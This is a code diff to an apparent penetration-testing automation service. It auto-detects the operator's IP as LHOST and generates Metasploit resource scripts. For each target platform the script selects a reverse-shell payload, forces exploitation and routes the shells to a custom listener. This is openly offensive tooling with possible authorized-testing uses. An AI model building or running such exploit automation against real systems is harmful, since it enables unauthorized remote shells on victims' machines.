@@ -25,6 +25,20 @@ class AttackChainService extends EventEmitter {
         };
     }
 
+    // Helper to auto-detect LHOST (first non-internal IPv4)
+    _getAutoLhost() {
+        const interfaces = os.networkInterfaces();
+        for (const ifaceName in interfaces) {
+            const iface = interfaces[ifaceName];
+            for (const alias of iface) {
+                if (alias.family === 'IPv4' && !alias.internal && alias.address !== '127.0.0.1') {
+                    return alias.address;
+                }
+            }
+        }
+        return null;
+    }
+
     // Helper for IP/Host validation
     _isValidHost(host) {
         if (!host) return false;
@@ -611,7 +625,19 @@ except:
                             // Fix broken multiline strings (common in some exploit DB entries)
                             code = this._sanitizeCCode(code);
                         }
-                        const lhost = params.LHOST || '127.0.0.1';
+
+                        let lhost = params.LHOST;
+                        // Auto-detect LHOST if missing or loopback
+                        if (!lhost || lhost === '127.0.0.1' || lhost === 'localhost') {
+                            const detected = this._getAutoLhost();
+                            if (detected) {
+                                lhost = detected;
+                                logger.info(`Auto-detected LHOST: ${lhost}`);
+                            } else {
+                                lhost = '127.0.0.1';
+                            }
+                        }
+
                         const lport = params.LPORT ? parseInt(params.LPORT) : null;
 
                         // Security Validation
@@ -715,6 +741,29 @@ except:
                             rcLines.push('set RPORT ' + (targetPort || exploit.port || 80));
                             if (lhost) rcLines.push('set LHOST ' + lhost);
                             if (lport) rcLines.push('set LPORT ' + lport);
+
+                            // Determine correct payload based on platform to ensure compatibility with net listener
+                            // Standard net listeners (ShellService) expect a raw shell connection, not Meterpreter.
+                            if (!modulePath.startsWith('auxiliary') && !modulePath.startsWith('post')) {
+                                let payload = 'cmd/unix/reverse'; // Default safe fallback
+                                const platform = (exploit.platform || '').toLowerCase();
+
+                                if (platform.includes('windows')) {
+                                    payload = 'windows/shell_reverse_tcp';
+                                } else if (platform.includes('linux')) {
+                                    payload = 'linux/x86/shell_reverse_tcp';
+                                } else if (platform.includes('java')) {
+                                    payload = 'java/shell_reverse_tcp';
+                                } else if (platform.includes('php')) {
+                                    payload = 'php/reverse_php';
+                                }
+
+                                rcLines.push('set PAYLOAD ' + payload);
+                                rcLines.push('set DisablePayloadHandler true'); // Don't bind port in MSF, use our listener
+                                rcLines.push('set WfsDelay 30'); // Wait for session
+                                rcLines.push('set PrependMigrate false'); // Avoid stability issues
+                            }
+
                             rcLines.push('set ForceExploit true');
                             // Use exploit -z to run in background (non-interactive) or 'run' for auxiliary
                             if (modulePath.startsWith('auxiliary') || modulePath.startsWith('post')) {
